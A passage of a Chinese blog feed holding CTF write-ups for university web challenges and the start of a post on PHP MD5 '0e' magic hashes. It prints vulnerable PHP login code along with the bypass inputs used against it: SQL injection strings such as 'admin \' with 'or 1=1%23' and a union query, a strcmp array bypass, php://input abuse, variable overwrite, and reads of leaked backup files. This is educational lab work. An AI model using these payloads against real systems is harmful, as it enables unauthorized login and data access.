mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=<span class="string">&quot;Username&quot;</span>&gt;</span><br><span class="line">&lt;input type=password name=pass value=<span class="string">&quot;Password&quot;</span>&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;</code>重点是这一行代码,我们得想办法绕过</p><p>在用户框输入admin,提示如下</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107095043648.png" alt="image-20191107095043648"></p><p>我们直接闭合单引号，然后注释后面的代码,拿到flag</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107095158798.png" alt="image-20191107095158798"></p><h2 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h2><p><a href="http://chinalover.sinaapp.com/web21/">题目链接</a></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass=@$_POST[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag:nctf&#123;*&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the pass is wrong!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;please input pass!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>strcmp()</code>函数的作用</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107095507687.png" alt="image-20191107095507687"></p><p> <strong>php5.3</strong>之前的<strong>strcmp</strong>的漏洞<br>当参数中的一个字符串是对象或者数组时，函数会返回0 </p><p>通过以上我们知道传入一个数组即可绕过，因为POST传参，所以我们使用burp</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107095955427.png" alt="image-20191107095955427"></p><p><strong>注：POST请求</strong></p><h2 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h2><p><a href="http://chinalover.sinaapp.com/web12/index.php">题目地址</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">       $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> $number == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">&#x27;*******&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">&#x27;key&#x27;</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;access denied&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 题目要求不能输入数字，但是输入的字符串必须和54975581388相同<br>用和54975581388等值的16进制表示，很巧，全不是数字，就成功了 </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107151919613.png" alt="image-20191107151919613"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107152003982.png" alt="image-20191107152003982"></p><p> 当遇到 与<strong>数字字符串对比校验</strong>的时候，可以尝试转换为<strong>等值的16进制字串</strong> </p><h2 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h2><p><a href="http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107152245864.png" alt="image-20191107152245864"> </p><p><code>Y3RmdXNlcg==</code>base64解码为<code>ctfyuser</code></p><p>思路就是将url的值admin使用base64编码，输入框的账号也改成admin</p><p><code>admin</code>使用base64加密得<code>YWRtaW4=</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107152635693.png" alt="image-20191107152635693"></p><h2 id="php-反序列化-暂时无法做"><a href="#php-反序列化-暂时无法做" class="headerlink" title="php 反序列化(暂时无法做)"></a>php 反序列化(暂时无法做)</h2><p>暂时无法做…待更新</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p><a href="http://chinalover.sinaapp.com/web15/index.php">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107153051664.png" alt="image-20191107153051664"></p><p>F12发现php代码,我们分析一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">$password = @clean((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">&#x27;SELECT * FROM users WHERE name=\&#x27;&#x27;</span>.$username.<span class="string">&#x27;\&#x27; AND pass=\&#x27;&#x27;</span>.$password.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>注意上面clean function中的htmlentities()函数，它会把输入字符中的 ’ 或者 ” 转变为html实体，这样一来就无法闭合源代码中的 ’ 了，还有就是，如果php的magic_quotes_gpc是开启状态的话，我们输入的转义符也会被去掉的，不过既然这道题目能做，说明我们是可以使用转义符 \ ，我们解这道题的关键就是使用转义符 \ 来让源代码中<br>‘SELECT * FROM users WHERE name=&#39;‘.$username.’&#39; AND pass=&#39;‘.$password.’&#39;;’<br>$username后面的 ’ 失效，只要 这个 ’ 失效，就能闭合name=后面的 ’ ，要达到这一目的，我们只需要让username=admin \即可，让后使password的值为一个永真式(or 1=1)就可以得到这道题的flag<br>这样提交的数据，会导致源代码中的SQL语句变为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">&#x27;admin \&#x27;</span> <span class="keyword">AND</span> pass=<span class="string">&#x27; or 1=1</span></span><br></pre></td></tr></table></figure><p> <code>?username=admin \&amp;password=or 1=1%23 </code>,%23是#的url编码</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107153424670.png" alt="image-20191107153424670"></p><h2 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h2><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107153553605.png" alt="image-20191107153553605.png"></p><p>我们直接将字符放在控制台执行</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107153720908.png" alt="image-20191107153720908.png"></p><p>我们访问这个页面</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107153805399.png" alt="image-20191107153805399.png"></p><p><code>history of bash</code>,在linux系统中，history命令都保存在家目录下的<code>.bash_history</code>文件中</p><p>访问<code>.bash_history</code>发现压缩包</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107153907913.png" alt="image-20191107153907913.png"></p><p>访问<code>flagbak.zip</code>文件</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107154006171.png" alt="image-20191107154006171.png"></p><h2 id="system（暂时无法做）"><a href="#system（暂时无法做）" class="headerlink" title="system（暂时无法做）"></a>system（暂时无法做）</h2><p>待更新…</p><h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p><a href="http://4.chinalover.sinaapp.com/web6/index.php">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107154110389.png" alt="image-20191107154110389.png"></p><p>发现源代码,分析一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">Secure Web Login II</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">&quot;select pw from ctf where user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=<span class="string">&quot;Username&quot;</span>&gt;</span><br><span class="line">&lt;input type=password name=pass value=<span class="string">&quot;Password&quot;</span>&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>1.用post方法输入两个变量</p><p>2.输入的变量pass的值经过MD5加密了</p><p>3.中存储的是sql命令的结果集</p><p>4.如果变量存在，并且，$pass与$query[pw]相等（不区分大小写）</p><p>所以我们考虑在$user上加上一个union语句，即向$query的结果集中在加一条，同时能够使得条4成立</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107154848929.png" alt="image-20191107154848929.png"></p><p> 注意需要在union前加一个 ‘ 用于闭合’$uesr’前的那个引号，#是为了注释点后面的那个引号 </p><h2 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h2><p>还不会，待更新…</p><h2 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TIPS:</span><br><span class="line">1.管理员邮箱观察一下就可以找到</span><br><span class="line">2.linux下一般使用vi编辑器，并且异常退出会留下备份文件</span><br><span class="line">3.弱类型bypass</span><br></pre></td></tr></table></figure><p><a href="http://nctf.nuptzj.cn/web14/index.php">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107155203134.png" alt="image-20191107155203134.png"></p><p>F12，发现管理员邮箱地址</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107155306673.png" alt="image-20191107155306673.png"></p><p>在linux系统中，文件写入出现异常，会在本地生成一个<code>.filename.swp</code>的文件 # 注filename是你的文件名，我们访问<code>.submit.php.swp</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107155606806.png" alt="image-20191107155606806.png"></p><p>源代码分析一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT &#x27;0&#x27;,</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, &#x27;****不可见***&#x27;, &#x27;***不可见***&#x27;, 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">&#x27;0&#x27;</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">$sql = <span class="string">&quot;SELECT count(*) as num from `user` where token=&#x27;<span class="subst">$token</span>&#x27; AND email=&#x27;<span class="subst">$emailAddress</span>&#x27;&quot;</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;db error&#x27;</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;失败了呀&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这边<code>$token</code>长度要等于10，<code>$token</code>= 0,所以我们构造10个0,<code>0000000000</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107160050767.png" alt="image-20191107160050767.png"></p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p><a href="http://chinalover.sinaapp.com/web23/">题目链接</a></p><p>F12,发现源代码</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107160357034.png" alt="image-20191107160357034.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($file) == <span class="string">&quot;meizijiu&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $nctf;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure><p>file_put_contens()函数的作用</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107160545789.png" alt="image-20191107160545789.png"></p><p>我们使用burp,结合<code>php://input</code>协议，传数据</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107160732042.png" alt="image-20191107160732042.png"></p><p>注意，结构如下图</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107160804657.png" alt="image-20191107160804657.png"></p><h2 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p><a href="http://chinalover.sinaapp.com/web24/">题目链接</a></p><p>F12,发现源代码</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107160957507.png" alt="image-20191107160957507.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>($name == <span class="string">&quot;meizijiu233&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure><p>GET传<code>name=meizijiu233</code>，使得<code>$key=name</code>，那么<code>$$key=$name</code>,这样来改变变量的值</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107161120433.png" alt="image-20191107161120433.png"></p><h2 id="注意！！"><a href="#注意！！" class="headerlink" title="注意！！"></a>注意！！</h2><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107161312350.png" alt="image-20191107161312350.png"></p><p>这个不是题</p><h2 id="HateIT"><a href="#HateIT" class="headerlink" title="HateIT"></a>HateIT</h2><p>做不了啊,待更新…</p><h2 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h2><p>做不了啊,待更新…</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>变量覆盖</li><li>进制转换(PHP)</li></ul><p>以上两点比较生疏，加强练习,最后，<code>F12</code>无敌!!! 没思路就F12</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;签到题&quot;&gt;&lt;a href=&quot;#签到题&quot; class=&quot;headerlink&quot; title=&quot;签到题&quot;&gt;&lt;/a&gt;签到题&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://chinalover.sinaapp.com/web1/&quot;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CTF" scheme="http://www.ywboy.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MD5碰撞和MD5值(哈希值)相等</title>
    <link href="http://www.ywboy.cn/2020/09/26/MD5%E7%A2%B0%E6%92%9E%E5%92%8CMD5%E5%80%BC(%E5%93%88%E5%B8%8C%E5%80%BC)%E7%9B%B8%E7%AD%89/"/>
    <id>http://www.ywboy.cn/2020/09/26/MD5%E7%A2%B0%E6%92%9E%E5%92%8CMD5%E5%80%BC(%E5%93%88%E5%B8%8C%E5%80%BC)%E7%9B%B8%E7%AD%89/</id>
    <published>2020-09-26T06:58:59.000Z</published>
    <updated>2020-09-26T07:00:12.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞叙述"><a href="#漏洞叙述" class="headerlink" title="漏洞叙述"></a>漏洞叙述</h1><p>  PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p><h2 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h2><p>做南邮CTF的时候遇到PHP中MD5哈希值相等的问题，在此做个记录<br>md5的碰撞，在PHP的数的处理中，0开头的字符串会被转换成0，所以才会有md5碰撞</p><h3 id="0e开头的md5和原值："><a href="#0e开头的md5和原值：" class="headerlink" title="0e开头的md5和原值："></a>0e开头的md5和原值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span 